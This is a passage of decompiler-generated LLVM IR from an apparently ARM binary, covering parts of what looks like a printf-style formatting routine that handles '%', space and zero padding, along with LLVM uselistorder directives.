  %v3_e2a0 = icmp ult i32 %v1_e29c, %v1_e250
  br i1 %v3_e2a0, label %dec_label_pc_e254, label %dec_label_pc_e414

dec_label_pc_e2ac:                                ; preds = %dec_label_pc_e120
  %v0_e2ac = load i32, i32* @sl, align 4
  store i32 %v0_e2ac, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_e2ac, i32* @r4, align 4
  br label %dec_label_pc_e2bc

dec_label_pc_e2bcthread-pre-split:                ; preds = %.thread85, %dec_label_pc_e0b0, %dec_label_pc_e168, %dec_label_pc_e1f4
  %v1_e2c0.pre = phi i32 [ %v1_e2c0.pre205, %dec_label_pc_e0b0 ], [ %v1_e2c0.pre.pre, %dec_label_pc_e168 ], [ 1, %dec_label_pc_e1f4 ], [ %v2_e030, %.thread85 ]
  %v0_e2c0.pre = phi i32 [ 0, %dec_label_pc_e0b0 ], [ %v0_e2c0.pre.pre, %dec_label_pc_e168 ], [ 0, %dec_label_pc_e1f4 ], [ %v2_e0a4, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_e024, %dec_label_pc_e0b0 ], [ %v0_df54, %dec_label_pc_e168 ], [ %v0_df54, %dec_label_pc_e1f4 ], [ %v0_e024, %.thread85 ]
  %v0_e2bc.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_e2bc

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e2bcthread-pre-split, %dec_label_pc_e1e4, %dec_label_pc_e19c, %dec_label_pc_e2ac
  %v1_e2c0 = phi i32 [ %v1_e2c0.pre, %dec_label_pc_e2bcthread-pre-split ], [ %storemerge97, %dec_label_pc_e1e4 ], [ %v3_e1a8, %dec_label_pc_e19c ], [ %v6_e134, %dec_label_pc_e2ac ]
  %v0_e2c0 = phi i32 [ %v0_e2c0.pre, %dec_label_pc_e2bcthread-pre-split ], [ 0, %dec_label_pc_e1e4 ], [ 0, %dec_label_pc_e19c ], [ %v0_e2ac, %dec_label_pc_e2ac ]
  %v0_e2c8 = phi i32 [ %v0_e2bc.pr, %dec_label_pc_e2bcthread-pre-split ], [ 11, %dec_label_pc_e1e4 ], [ 11, %dec_label_pc_e19c ], [ 11, %dec_label_pc_e2ac ]
  %v0_e308 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_e2bcthread-pre-split ], [ %v0_df54, %dec_label_pc_e1e4 ], [ %v0_df54, %dec_label_pc_e19c ], [ %v0_df54, %dec_label_pc_e2ac ]
  %v7_e2bc = icmp eq i32 %v0_e2c8, 11
  %v2_e2c0 = add i32 %v1_e2c0, %v0_e2c0
  br i1 %v7_e2bc, label %dec_label_pc_e2d8, label %bb173

bb173:                                            ; preds = %dec_label_pc_e2bc
  %v7_e2d0 = icmp sgt i32 %v0_e2c8, 5
  %. = select i1 %v7_e2d0, i32 2, i32 1
  %v2_e2d4 = add i32 %v2_e2c0, %.
  br label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2bc, %bb173
  %v0_e2ec = phi i32 [ %v2_e2c0, %dec_label_pc_e2bc ], [ %v2_e2d4, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_e2dc = icmp uge i32 %tmp98, %v0_e2ec
  %v9_e2dc = icmp eq i32 %tmp98, %v0_e2ec
  %v2_e2e0 = xor i1 %v9_e2dc, true
  %v3_e2e0 = and i1 %v3_e2dc, %v2_e2e0
  br i1 %v3_e2e0, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_e2d8
  %v2_e2dc = sub i32 %tmp98, %v0_e2ec
  store i32 %v2_e2dc, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_e2d8, %bb174
  store i32 %v1_e2ec, i32* %r2.global-to-local, align 4
  %v2_e2e8 = xor i1 %v3_e2dc, true
  %v3_e2e8 = or i1 %v9_e2dc, %v2_e2e8
  br i1 %v3_e2e8, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_e2f0.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_e300 = phi i32 [ %v1_e2f0.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_e2ec = add i32 %v0_e2ec, %v1_e2ec
  %v2_e2f0 = add i32 %v2_e2ec, %v2_e300
  %v0_e2fc = load i32, i32* @sb, align 4
  %v7_e2fc = icmp eq i32 %v0_e2fc, 48
  br i1 %v7_e2fc, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_e300 = add i32 %v2_e300, %v0_e2c0
  store i32 %v3_e300, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_e318 = phi i32 [ %v2_e300, %bb177 ], [ 0, %bb178 ]
  %v1_e308 = and i32 %v0_e308, 8
  store i32 %v1_e308, i32* @r7, align 4
  %v2_e308 = icmp eq i32 %v1_e308, 0
  br i1 %v2_e308, label %dec_label_pc_e310, label %dec_label_pc_e32c

dec_label_pc_e310:                                ; preds = %.thread30
  %v0_e310 = load i32, i32* @fp, align 4
  store i32 %v0_e310, i32* %r0.global-to-local, align 4
  store i32 %v0_e318, i32* %r2.global-to-local, align 4
  %v4_e31c = call i32 @function_dc8c(i32 %v0_e310, i8 32, i32 %v0_e318)
  store i32 %v4_e31c, i32* %r0.global-to-local, align 4
  %v1_e320 = load i32, i32* @sl, align 4
  %v9_e320 = icmp eq i32 %v4_e31c, %v1_e320
  br i1 %v9_e320, label %dec_label_pc_e328, label %dec_label_pc_e414

dec_label_pc_e328:                                ; preds = %dec_label_pc_e310
  %v0_e328 = load i32, i32* @r7, align 4
  store i32 %v0_e328, i32* @sl, align 4
  %v0_e334.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e32c

dec_label_pc_e32c:                                ; preds = %.thread30, %dec_label_pc_e328
  %v0_e334 = phi i32 [ %v0_e2c8, %.thread30 ], [ %v0_e334.pre, %dec_label_pc_e328 ]
  %v0_e330 = load i32, i32* @fp, align 4
  %v2_e334 = add i32 %v0_e334, ptrtoint (i32* @global_var_19ac0.319 to i32)
  store i32 %v2_e334, i32* %r0.global-to-local, align 4
  %v2_e338 = call i32 @function_f4e8(i32 %v2_e334, i32 %v0_e330)
  %v0_e33c = load i32, i32* @fp, align 4
  store i32 %v0_e33c, i32* %r0.global-to-local, align 4
  %v0_e344 = load i32, i32* @r8, align 4
  store i32 %v0_e344, i32* %r2.global-to-local, align 4
  %v4_e348 = call i32 @function_dc8c(i32 %v0_e33c, i8 48, i32 %v0_e344)
  store i32 %v4_e348, i32* %r0.global-to-local, align 4
  %v1_e34c = load i32, i32* @r8, align 4
  %v9_e34c = icmp eq i32 %v4_e348, %v1_e34c
  br i1 %v9_e34c, label %dec_label_pc_e354, label %dec_label_pc_e414

dec_label_pc_e354:                                ; preds = %dec_label_pc_e32c
  %v3_e354 = load i32, i32* %stack_var_-44, align 4
  %v2_e358 = icmp eq i32 %v3_e354, 0
  br i1 %v2_e358, label %dec_label_pc_e360, label %dec_label_pc_e384

dec_label_pc_e360:                                ; preds = %dec_label_pc_e354
  %v0_e360 = load i32, i32* @r5, align 4
  %v2_e360 = icmp eq i32 %v0_e360, 0
  br i1 %v2_e360, label %dec_label_pc_e3e8, label %dec_label_pc_e368

dec_label_pc_e368:                                ; preds = %dec_label_pc_e360
  %v0_e368 = load i32, i32* @r4, align 4
  store i32 %v0_e368, i32* %r0.global-to-local, align 4
  %v0_e370 = load i32, i32* @fp, align 4
  store i32 %v0_e370, i32* %r2.global-to-local, align 4
  %v4_e374 = inttoptr i32 %v0_e370 to i16*
  %v5_e374 = call i32 @function_138f4(i32 %v0_e368, i32 %v0_e360, i16* %v4_e374)
  store i32 %v5_e374, i32* %r0.global-to-local, align 4
  %v1_e378 = load i32, i32* @r5, align 4
  %v9_e378 = icmp eq i32 %v5_e374, %v1_e378
  br i1 %v9_e378, label %dec_label_pc_e3e8, label %dec_label_pc_e414

dec_label_pc_e384:                                ; preds = %dec_label_pc_e354
  store i32 %v2_e228, i32* @r6, align 4
  store i32 %v2_e124, i32* @r8, align 4
  store i32 %v2_e130, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_e3d4.pr = load i32, i32* @r5, align 4
  %v2_e3d441 = icmp eq i32 %v0_e3d4.pr, 0
  store i32 %v2_e124, i32* @r1, align 4
  store i32 %v2_e228, i32* @r0, align 4
  br i1 %v2_e3d441, label %dec_label_pc_e3e8, label %dec_label_pc_e39c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e384, %dec_label_pc_e3d0
  %v1_e3a0 = phi i32 [ %v2_e3d0, %dec_label_pc_e3d0 ], [ %v0_e3d4.pr, %dec_label_pc_e384 ]
  %v2_e39c = icmp ult i32 %v1_e3a0, 128
  %.v1_e3a0 = select i1 %v2_e39c, i32 %v1_e3a0, i32 128
  store i32 %.v1_e3a0, i32* %r2.global-to-local, align 4
  %v6_e3a8 = call i32 @function_13730(i32 %v2_e228, i32 %v2_e124, i32 %.v1_e3a0, i32 %v2_e130, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_e3a8, i32* @r4, align 4
  %v2_e3ac = icmp eq i32 %v6_e3a8, 0
  store i32 %v6_e3a8, i32* %r0.global-to-local, align 4
  br i1 %v2_e3ac, label %dec_label_pc_e3d0, label %dec_label_pc_e3b8

dec_label_pc_e3b8:                                ; preds = %dec_label_pc_e39c
  store i32 %v2_e228, i32* %r0.global-to-local, align 4
  %v0_e3c0 = load i32, i32* @fp, align 4
  store i32 %v0_e3c0, i32* %r2.global-to-local, align 4
  %v3_e3c4 = inttoptr i32 %v0_e3c0 to i16*
  %v4_e3c4 = call i32 @function_138f4(i32 %v2_e228, i32 %v6_e3a8, i16* %v3_e3c4)
  store i32 %v4_e3c4, i32* %r0.global-to-local, align 4
  %v1_e3c8 = load i32, i32* @r4, align 4
  %v9_e3c8 = icmp eq i32 %v4_e3c4, %v1_e3c8
  br i1 %v9_e3c8, label %dec_label_pc_e3d0, label %dec_label_pc_e414

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e3b8, %dec_label_pc_e39c
  %v0_e3d0 = phi i32 [ %v4_e3c4, %dec_label_pc_e3b8 ], [ 0, %dec_label_pc_e39c ]
  %v1_e3d0 = load i32, i32* @r5, align 4
  %v2_e3d0 = sub i32 %v1_e3d0, %v0_e3d0
  store i32 %v2_e3d0, i32* @r5, align 4
  %v2_e3d4 = icmp eq i32 %v2_e3d0, 0
  store i32 %v2_e124, i32* @r1, align 4
  store i32 %v2_e228, i32* @r0, align 4
  br i1 %v2_e3d4, label %dec_label_pc_e3e8, label %dec_label_pc_e39c

dec_label_pc_e3e8:                                ; preds = %dec_label_pc_e3d0, %dec_label_pc_e384, %dec_label_pc_e368, %dec_label_pc_e360
  %v0_e3e8 = load i32, i32* @fp, align 4
  store i32 %v0_e3e8, i32* %r0.global-to-local, align 4
  %v0_e3f0 = load i32, i32* @sl, align 4
  store i32 %v0_e3f0, i32* %r2.global-to-local, align 4
  %v4_e3f4 = call i32 @function_dc8c(i32 %v0_e3e8, i8 32, i32 %v0_e3f0)
  store i32 %v4_e3f4, i32* %r0.global-to-local, align 4
  %v1_e3f8 = load i32, i32* @sl, align 4
  %v9_e3f8 = icmp eq i32 %v4_e3f4, %v1_e3f8
  br i1 %v9_e3f8, label %dec_label_pc_e400, label %dec_label_pc_e414

dec_label_pc_e400:                                ; preds = %dec_label_pc_e3e8, %dec_label_pc_e28c, %dec_label_pc_e0e8, %dec_label_pc_def8
  %stack_var_-336.4 = phi i32 [ %v0_df54, %dec_label_pc_def8 ], [ %v0_e308, %dec_label_pc_e3e8 ], [ %v0_df54, %dec_label_pc_e28c ], [ %v0_df54, %dec_label_pc_e0e8 ]
  %stack_var_-356.3 = phi i32 [ %v1_e2ec, %dec_label_pc_def8 ], [ %v2_e2f0, %dec_label_pc_e3e8 ], [ %v2_e290, %dec_label_pc_e28c ], [ %v2_e0ec, %dec_label_pc_e0e8 ]
  %v3_e400 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_e400, i32* @r4, align 4
  store i32 %v3_e400, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_de20.outer

dec_label_pc_e40c:                                ; preds = %dec_label_pc_de7c
  %v1_e40c = add i32 %v0_de84, 2
  store i32 %v1_e40c, i32* @r4, align 4
  br label %dec_label_pc_de20.outer36

dec_label_pc_e414:                                ; preds = %dec_label_pc_e29c, %dec_label_pc_e120, %dec_label_pc_e3e8, %dec_label_pc_e368, %dec_label_pc_e32c, %dec_label_pc_e310, %dec_label_pc_e264, %dec_label_pc_e148, %dec_label_pc_e0c0, %bb142, %dec_label_pc_e3b8
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_e41c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_de70, %bb, %dec_label_pc_ddb4, %dec_label_pc_e414
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_ddb4 ], [ -1, %dec_label_pc_e414 ], [ %v1_e2ec, %dec_label_pc_de70 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_dd64, i32* @r5, align 4
  store i32 %v12_dd64, i32* %r7.global-to-local, align 4
  store i32 %v18_dd64, i32* @sb, align 4
  store i32 %v21_dd64, i32* @sl, align 4
  store i32 %v24_dd64, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_e40c, { 1, 0 }
  uselistorder i32 %v3_e400, { 1, 2, 0 }
  uselistorder i32 %v2_e3d0, { 1, 2, 0 }
  uselistorder i32 %v0_e318, { 1, 0 }
  uselistorder i32 %v2_e300, { 2, 0, 1 }
  uselistorder i1 %v9_e2dc, { 1, 0 }
  uselistorder i32 %v2_e2c0, { 1, 0 }
  uselistorder i32 %v0_e308, { 1, 0 }
  uselistorder i32 %v0_e2c0, { 1, 0 }
  uselistorder i32 %v1_e29c, { 1, 0 }
  uselistorder i32 %v1_e264, { 1, 0, 2 }
  uselistorder i32 %v3_e234, { 1, 2, 0 }
  uselistorder i32 %v0_e1a0, { 1, 0 }
  uselistorder i32 %v2_e190, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_e158, { 1, 2, 0, 3 }
  uselistorder i32 %v3_e0d0, { 1, 0 }
  uselistorder i32 %v2_e030, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_e04c, { 1, 2, 3, 0 }
  uselistorder i32 %v2_dfcc, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_df34, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_ded8.pre, { 1, 0, 2 }
  uselistorder i32 %v1_ded0, { 1, 0 }
  uselistorder i32 %v1_de7c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_e2ec, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_de3c, { 1, 0 }
  uselistorder i32 %v1_de34.lcssa, { 1, 0 }
  uselistorder i8 %v2_de20, { 1, 0 }
  uselistorder i32 %v2_de34, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_de4c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_df54, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_e044, { 1, 0 }
  uselistorder i1 %v7_df94, { 1, 2, 0 }
  uselistorder i1 %v7_e180, { 1, 0 }
  uselistorder i1 %v7_e0f8, { 1, 0 }
  uselistorder i1 %v7_dfd4, { 1, 0 }
  uselistorder i32 %v2_e130, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_e124, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_e228, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_ded4, { 1, 3, 2, 0 }
  uselistorder i32 %v4_deb0, { 1, 0 }
  uselistorder i32 %v2_dd6c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 23, 24, 26, 25, 3, 27, 28, 29, 30, 31, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 11, 13, 12, 16, 14, 15, 18, 17, 19, 21, 20, 46, 22, 23, 24, 25, 47, 26, 45, 27, 28, 10, 29, 7, 30, 6, 31, 4, 32, 9, 33, 34, 36, 37, 2, 35, 38, 39, 3, 44, 1, 40, 5, 41, 42, 8, 43, 0 }
  uselistorder i32 (i32, i8, i32)* @function_dc8c, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_13730, { 1, 0 }
  uselistorder i32 56544, { 1, 0 }
  uselistorder label %dec_label_pc_e41c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e414, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_e39c, { 1, 0 }
  uselistorder label %dec_label_pc_e32c, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_e2d8, { 1, 0 }
  uselistorder label %dec_label_pc_e2bc, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_e2bcthread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e1e4, { 1, 0 }
  uselistorder label %dec_label_pc_e19c, { 1, 0 }
  uselistorder label %dec_label_pc_e0b0, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_df84, { 1, 0 }
  uselistorder label %dec_label_pc_df80, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_decc, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_de70, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_de3c, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_de20.outer36, { 1, 0 }
}

define i32 @function_e44c(i32* %arg1) local_unnamed_addr {
dec_label_pc_e44c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_e44c = load i32, i32* @r4, align 4
  %v6_e44c = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_e458 = load i32, i32* @r1, align 4
  store i32 %v0_e458, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e464 = bitcast i32* %arg1 to i8*
  %v3_e464 = call i32 @function_f5d0(i8* %v2_e464, i32 0)
  store i32 %v3_e464, i32* %r0.global-to-local, align 4
  %v0_e468 = load i32, i32* @r4, align 4
  %v1_e468 = add i32 %v0_e468, 24
  %v2_e468 = inttoptr i32 %v1_e468 to i32*
  %v3_e468 = load i32, i32* %v2_e468, align 4
  store i32 %v3_e468, i32* %r3.global-to-local, align 4
  %v0_e46c = load i32, i32* @r5, align 4
  %v2_e46c = inttoptr i32 %v0_e468 to i32*
  store i32 %v0_e46c, i32* %v2_e46c, align 4
  %v0_e470 = load i32, i32* %r3.global-to-local, align 4
  %v1_e470 = add i32 %v0_e470, -1
  %v1_e474 = load i32, i32* @r4, align 4
  %v2_e474 = add i32 %v1_e474, 24
  %v3_e474 = inttoptr i32 %v2_e474 to i32*
  store i32 %v1_e470, i32* %v3_e474, align 4
  %v0_e478 = load i32, i32* @r4, align 4
  %v1_e478 = add i32 %v0_e478, 40
  store i32 %v1_e478, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_e48821 = inttoptr i32 %v1_e478 to i32*
  store i32 8, i32* %v2_e48821, align 4
  %v3_e48822 = load i32, i32* %r2.global-to-local, align 4
  %v4_e48823 = add i32 %v3_e48822, 4
  store i32 %v4_e48823, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e484.dec_label_pc_e484_crit_edge

dec_label_pc_e484.dec_label_pc_e484_crit_edge:    ; preds = %dec_label_pc_e44c, %dec_label_pc_e484.dec_label_pc_e484_crit_edge
  %v4_e48824 = phi i32 [ %v4_e48823, %dec_label_pc_e44c ], [ %v4_e488, %dec_label_pc_e484.dec_label_pc_e484_crit_edge ]
  %v0_e484.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_e488.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_e484 = add i32 %v0_e484.pre, -1
  store i32 %v1_e484, i32* %r3.global-to-local, align 4
  %v7_e484 = icmp eq i32 %v0_e484.pre, 1
  %v2_e488 = inttoptr i32 %v4_e48824 to i32*
  store i32 %v0_e488.pre, i32* %v2_e488, align 4
  %v3_e488 = load i32, i32* %r2.global-to-local, align 4
  %v4_e488 = add i32 %v3_e488, 4
  store i32 %v4_e488, i32* %r2.global-to-local, align 4
  br i1 %v7_e484, label %dec_label_pc_e490, label %dec_label_pc_e484.dec_label_pc_e484_crit_edge

dec_label_pc_e490:                                ; preds = %dec_label_pc_e484.dec_label_pc_e484_crit_edge
  %v0_e490 = load i32, i32* @r5, align 4
  store i32 %v0_e490, i32* %r2.global-to-local, align 4
  %v1_e4d02 = inttoptr i32 %v0_e490 to i8*
  %v2_e4d03 = load i8, i8* %v1_e4d02, align 1
  %v3_e4d04 = zext i8 %v2_e4d03 to i32
  store i32 %v3_e4d04, i32* %r0.global-to-local, align 4
  %v2_e4d45 = icmp eq i8 %v2_e4d03, 0
  br i1 %v2_e4d45, label %dec_label_pc_e4dc, label %dec_label_pc_e498

dec_label_pc_e498:                                ; preds = %dec_label_pc_e490, %dec_label_pc_e4d0.backedge
  %v0_e4a0 = phi i32 [ %storemerge, %dec_label_pc_e4d0.backedge ], [ %v0_e490, %dec_label_pc_e490 ]
  %v0_e498 = phi i32 [ %v3_e4d0, %dec_label_pc_e4d0.backedge ], [ %v3_e4d04, %dec_label_pc_e490 ]
  %v7_e498 = icmp eq i32 %v0_e498, 37
  br i1 %v7_e498, label %dec_label_pc_e4a0, label %dec_label_pc_e4cc

dec_label_pc_e4a0:                                ; preds = %dec_label_pc_e498
  %v1_e4a0 = add i32 %v0_e4a0, 1
  %v2_e4a0 = inttoptr i32 %v1_e4a0 to i8*
  %v3_e4a0 = load i8, i8* %v2_e4a0, align 1
  %v4_e4a0 = zext i8 %v3_e4a0 to i32
  store i32 %v4_e4a0, i32* %r3.global-to-local, align 4
  store i32 %v1_e4a0, i32* %r2.global-to-local, align 4
  %v7_e4a4 = icmp eq i8 %v3_e4a0, 37
  br i1 %v7_e4a4, label %dec_label_pc_e4cc, label %dec_label_pc_e4ac

dec_label_pc_e4ac:                                ; preds = %dec_label_pc_e4a0
  %v1_e4ac = load i32, i32* @r4, align 4
  %v2_e4ac = inttoptr i32 %v1_e4ac to i32*
  store i32 %v1_e4a0, i32* %v2_e4ac, align 4
  %v0_e4b0 = load i32, i32* @r4, align 4
  store i32 %v0_e4b0, i32* %r0.global-to-local, align 4
  %v1_e4b4 = inttoptr i32 %v0_e4b0 to i8*
  %v2_e4b4 = call i32 @function_e734(i8* %v1_e4b4)
  store i32 %v2_e4b4, i32* %r0.global-to-local, align 4
  %v1_e4b8 = icmp slt i32 %v2_e4b4, 0
  br i1 %v1_e4b8, label %dec_label_pc_e4e0.loopexit, label %dec_label_pc_e4c4

dec_label_pc_e4c4:                                ; preds = %dec_label_pc_e4ac
  %v0_e4c4 = load i32, i32* @r4, align 4
  %v1_e4c4 = inttoptr i32 %v0_e4c4 to i32*
  %v2_e4c4 = load i32, i32* %v1_e4c4, align 4
  br label %dec_label_pc_e4d0.backedge

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e498, %dec_label_pc_e4a0
  %v0_e4cc = phi i32 [ %v0_e4a0, %dec_label_pc_e498 ], [ %v1_e4a0, %dec_label_pc_e4a0 ]
  %v1_e4cc = add i32 %v0_e4cc, 1
  br label %dec_label_pc_e4d0.backedge

dec_label_pc_e4d0.backedge:                       ; preds = %dec_label_pc_e4cc, %dec_label_pc_e4c4
  %storemerge = phi i32 [ %v1_e4cc, %dec_label_pc_e4cc ], [ %v2_e4c4, %dec_label_pc_e4c4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_e4d0 = inttoptr i32 %storemerge to i8*
  %v2_e4d0 = load i8, i8* %v1_e4d0, align 1
  %v3_e4d0 = zext i8 %v2_e4d0 to i32
  store i32 %v3_e4d0, i32* %r0.global-to-local, align 4
  %v2_e4d4 = icmp eq i8 %v2_e4d0, 0
  br i1 %v2_e4d4, label %dec_label_pc_e4d0.dec_label_pc_e4dc_crit_edge, label %dec_label_pc_e498

dec_label_pc_e4d0.dec_label_pc_e4dc_crit_edge:    ; preds = %dec_label_pc_e4d0.backedge
  %v0_e4dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e4dc

dec_label_pc_e4dc:                                ; preds = %dec_label_pc_e4d0.dec_label_pc_e4dc_crit_edge, %dec_label_pc_e490
  %v0_e4dc = phi i32 [ %v0_e4dc.pre, %dec_label_pc_e4d0.dec_label_pc_e4dc_crit_edge ], [ %v0_e490, %dec_label_pc_e490 ]
  %v1_e4dc = load i32, i32* @r4, align 4
  %v2_e4dc = inttoptr i32 %v1_e4dc to i32*
  store i32 %v0_e4dc, i32* %v2_e4dc, align 4
  %v1_e4e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e0

dec_label_pc_e4e0.loopexit:                       ; preds = %dec_label_pc_e4ac
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e0

dec_label_pc_e4e0:                                ; preds = %dec_label_pc_e4e0.loopexit, %dec_label_pc_e4dc
  %v1_e4e8 = phi i32 [ -1, %dec_label_pc_e4e0.loopexit ], [ %v1_e4e8.pre, %dec_label_pc_e4dc ]
  store i32 %v3_e44c, i32* @r4, align 4
  store i32 %v6_e44c, i32* @r5, align 4
  ret i32 %v1_e4e8

; uselistorder directives
  uselistorder i32 %v3_e4d0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_e490, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e488, { 1, 0 }
  uselistorder i32 %v0_e484.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder label %dec_label_pc_e4cc, { 1, 0 }
  uselistorder label %dec_label_pc_e498, { 1, 0 }
  uselistorder label %dec_label_pc_e484.dec_label_pc_e484_crit_edge, { 1, 0 }
}

define i32 @function_e4ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e4ec:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e4ec = load i32, i32* @r4, align 4
  store i32 %v3_e4ec, i32* %stack_var_-12, align 4
  %v0_e4f0 = load i32, i32* @r0, align 4
  %v1_e4f0 = add i32 %v0_e4f0, 24
  %v2_e4f0 = inttoptr i32 %v1_e4f0 to i32*
  %v3_e4f0 = load i32, i32* %v2_e4f0, align 4
  store i32 %v3_e4f0, i32* %r5.global-to-local, align 4
  store i32 %v0_e4f0, i32* @r4, align 4
  %v2_e500 = add i32 %v0_e4f0, 76
  %v3_e500 = inttoptr i32 %v2_e500 to i32*
  store i32 %arg2, i32* %v3_e500, align 4
  %tmp5 = icmp slt i32 %v3_e4f0, 1
  br i1 %tmp5, label %dec_label_pc_e524, label %dec_label_pc_e508

dec_label_pc_e508:                                ; preds = %dec_label_pc_e4ec
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e50c = load i32, i32* @r0, align 4
  %v2_e50c = add i32 %v1_e50c, 8
  %v3_e50c = inttoptr i32 %v2_e50c to i32*
  store i32 0, i32* %v3_e50c, align 4
  %v0_e510 = load i32, i32* %r5.global-to-local, align 4
  %v1_e510 = load i32, i32* @r0, align 4
  %v2_e510 = add i32 %v1_e510, 28
  %v3_e510 = inttoptr i32 %v2_e510 to i32*
  store i32 %v0_e510, i32* %v3_e510, align 4
  %v0_e514 = load i32, i32* %r3.global-to-local, align 4
  %v1_e514 = load i32, i32* @r0, align 4
